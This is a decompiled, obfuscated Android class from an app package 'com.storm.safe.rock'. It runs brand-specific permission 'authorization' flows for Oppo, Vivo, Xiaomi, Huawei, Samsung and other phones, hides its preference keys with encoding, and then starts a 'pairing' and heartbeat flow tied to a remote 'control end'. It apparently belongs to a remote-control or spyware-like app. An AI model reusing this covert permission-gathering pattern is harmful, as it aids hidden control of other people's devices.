package com.storm.safe.rock.service.modules;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.yw5xud.C0372a9;
import com.storm.safe.rock.util.StringUtil;
import java.util.LinkedHashMap;
import java.util.Locale;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0147bu;
import p000.C0873ms;
import p000.ExecutorC1158qw;
import p000.RunnableC0941o6;
import p000.sk1;
import p000.t60;
import p000.tz0;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.b4 */
/* loaded from: classes2.dex */
public final class C0329b4 {

    /* renamed from: a6 */
    public static final /* synthetic */ int f53194a6 = 0;

    /* renamed from: a0 */
    public final dqtvuisjd f53195a0;

    /* renamed from: a1 */
    public final Context f53196a1;

    /* renamed from: a2 */
    public C0873ms f53197a2;

    /* renamed from: a3 */
    public final LinkedHashMap f53198a3;

    /* renamed from: a4 */
    public final C0372a9 f53199a4;

    /* renamed from: a5 */
    public volatile boolean f53200a5;

    static {
        new sk1(null);
    }

    public C0329b4(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(dqtvuisjdVar2, "context");
        this.f53195a0 = dqtvuisjdVar;
        this.f53196a1 = dqtvuisjdVar2;
        ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
        y21 y21Var = new y21();
        executorC1158qw.getClass();
        this.f53197a2 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, y21Var));
        LinkedHashMap linkedHashMap = new LinkedHashMap();
        this.f53198a3 = linkedHashMap;
        C0372a9 c0372a9 = new C0372a9(dqtvuisjdVar, dqtvuisjdVar2);
        this.f53199a4 = c0372a9;
        linkedHashMap.put("oppo", c0372a9);
        linkedHashMap.put("oneplus", c0372a9);
        linkedHashMap.put("realme", c0372a9);
        linkedHashMap.put("huawei", c0372a9);
        linkedHashMap.put("honor", c0372a9);
        linkedHashMap.put("vivo", c0372a9);
        linkedHashMap.put("mi", c0372a9);
        linkedHashMap.put("xiaomi", c0372a9);
        linkedHashMap.put("redmi", c0372a9);
        linkedHashMap.put("samsung", c0372a9);
    }

    /* renamed from: a0 */
    public static final void m211762a0(C0329b4 c0329b4, C0147bu c0147bu) {
        if (c0147bu.f46000a0) {
            AbstractC0003a2.m44c5("授权成功: ", c0147bu.f46001a1.size(), "个流程完成", "obzzniixzpin");
            return;
        }
        t60.m214726f4("obzzniixzpin", "⚠️ 设备授权配置部分失败");
        t60.m214726f4("obzzniixzpin", "❌ 授权失败的项目: ".concat(AbstractC0715je.m213295i2(c0147bu.f46002a2, ", ", null, null, null, 62)));
        if (c0147bu.f46003a3.isEmpty()) {
            return;
        }
        t60.m214726f4("obzzniixzpin", "⚠️ 警告信息: ".concat(AbstractC0715je.m213295i2(c0147bu.f46003a3, ", ", null, null, null, 62)));
    }

    /* renamed from: a1 */
    public static final void m211763a1(C0329b4 c0329b4) {
        Context context = c0329b4.f53196a1;
        try {
            context.getSharedPreferences(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHw=="), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).putString(StringUtil.m212470a0("KkwFMkIqBTRSNRRdFCxEOwk="), m211765a3()).putLong("authorization_time", System.currentTimeMillis()).apply();
            context.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).apply();
            t60.m214714d6("obzzniixzpin", "✅ 授权完成状态已标记（authorization + app_state）");
        } catch (Exception e) {
            t60.m214705c6("obzzniixzpin", "❌ 标记授权完成状态失败", e);
        }
    }

    /* renamed from: a2 */
    public static final void m211764a2(C0329b4 c0329b4) {
        try {
            c0329b4.f53195a0.m211511k7();
        } catch (Exception e) {
            t60.m214705c6("obzzniixzpin", "❌ 恢复WRITE_SETTINGS权限申请失败", e);
        }
    }

    /* renamed from: a3 */
    public static String m211765a3() {
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = Build.MANUFACTURER;
        t60.m214694b5(str2, "MANUFACTURER");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str3 = "vivo";
        if (!AbstractC0779a1.m213652a5(lowerCase, "vivo", false) && !AbstractC0779a1.m213652a5(lowerCase, "iqoo", false)) {
            str3 = "oppo";
            if (!AbstractC0779a1.m213652a5(lowerCase, "oppo", false) && !AbstractC0779a1.m213652a5(lowerCase2, "oppo", false)) {
                str3 = "honor";
                if (!AbstractC0779a1.m213652a5(lowerCase, "honor", false) && !AbstractC0779a1.m213652a5(lowerCase, "hihonor", false)) {
                    str3 = "xiaomi";
                    if (!AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) && !AbstractC0779a1.m213652a5(lowerCase, "redmi", false)) {
                        if (AbstractC0779a1.m213652a5(lowerCase, "oneplus", false)) {
                            return "oneplus";
                        }
                        String str4 = "huawei";
                        if (!AbstractC0779a1.m213652a5(lowerCase, "huawei", false) && !AbstractC0779a1.m213652a5(lowerCase2, "huawei", false)) {
                            if (AbstractC0779a1.m213652a5(lowerCase, "samsung", false)) {
                                return "samsung";
                            }
                            str4 = "realme";
                            if (!AbstractC0779a1.m213652a5(lowerCase, "realme", false) && !AbstractC0779a1.m213652a5(lowerCase2, "realme", false)) {
                                return null;
                            }
                        }
                        return str4;
                    }
                    if (AbstractC0779a1.m213652a5(lowerCase, "redmi", false)) {
                        return "redmi";
                    }
                }
            }
        }
        return str3;
    }

    /* renamed from: a4 */
    public final boolean m211766a4() {
        boolean z = this.f53200a5;
        C0372a9 c0372a9 = this.f53199a4;
        return z || (c0372a9 != null && c0372a9.f55149a6);
    }

    /* renamed from: a5 */
    public final void m211767a5() {
        try {
            t60.m214714d6("obzzniixzpin", "★★★ 授权流程结束，启动延迟初始化 + 配对流程 ★★★");
            this.f53196a1.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).apply();
            try {
                this.f53195a0.m211504j8();
            } catch (Exception e) {
                t60.m214705c6("obzzniixzpin", "❌ postAuthorizationInit 失败", e);
            }
            new Handler(Looper.getMainLooper()).post(new RunnableC0941o6(23, this));
            t60.m214714d6("obzzniixzpin", "⏸️ [配对] 自动部署已禁用，请通过控制端手动部署");
        } catch (Exception e2) {
            t60.m214705c6("obzzniixzpin", "❌ 通知授权阶段完成失败", e2);
        }
    }

    /* renamed from: a6 */
    public final void m211768a6() {
        SharedPreferences sharedPreferences;
        boolean z;
        String string;
        String strM211765a3;
        if (this.f53200a5) {
            t60.m214726f4("obzzniixzpin", "⚠️ 授权流程已在进行中，跳过");
            return;
        }
        Context context = this.f53196a1;
        try {
            sharedPreferences = context.getSharedPreferences(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHw=="), 0);
            z = sharedPreferences.getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false);
            string = sharedPreferences.getString(StringUtil.m212470a0("KkwFMkIqBTRSNRRdFCxEOwk="), null);
            strM211765a3 = m211765a3();
        } catch (Exception e) {
            tz0.m214807a7("❌ 检查授权状态失败: ", e.getMessage(), "obzzniixzpin");
        }
        if (!z || !t60.m214686a2(string, strM211765a3)) {
            if (context.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false)) {
                t60.m214714d6("obzzniixzpin", "✅ [授权检查] app_state.authorization_completed=true，视为已完成（同步authorization标志）");
                try {
                    sharedPreferences.edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).putString(StringUtil.m212470a0("KkwFMkIqBTRSNRRdFCxEOwk="), strM211765a3).putLong("authorization_time", System.currentTimeMillis()).apply();
                } catch (Exception unused) {
                }
            }
            AbstractC0780a0.m213692a3(this.f53197a2, null, new obzzniixzpin$startAuthorization$1(this, null), 3);
            return;
        }
        t60.m214714d6("obzzniixzpin", "✅ 授权已完成，直接启动配对流程（心跳检测）");
        m211767a5();
    }
}
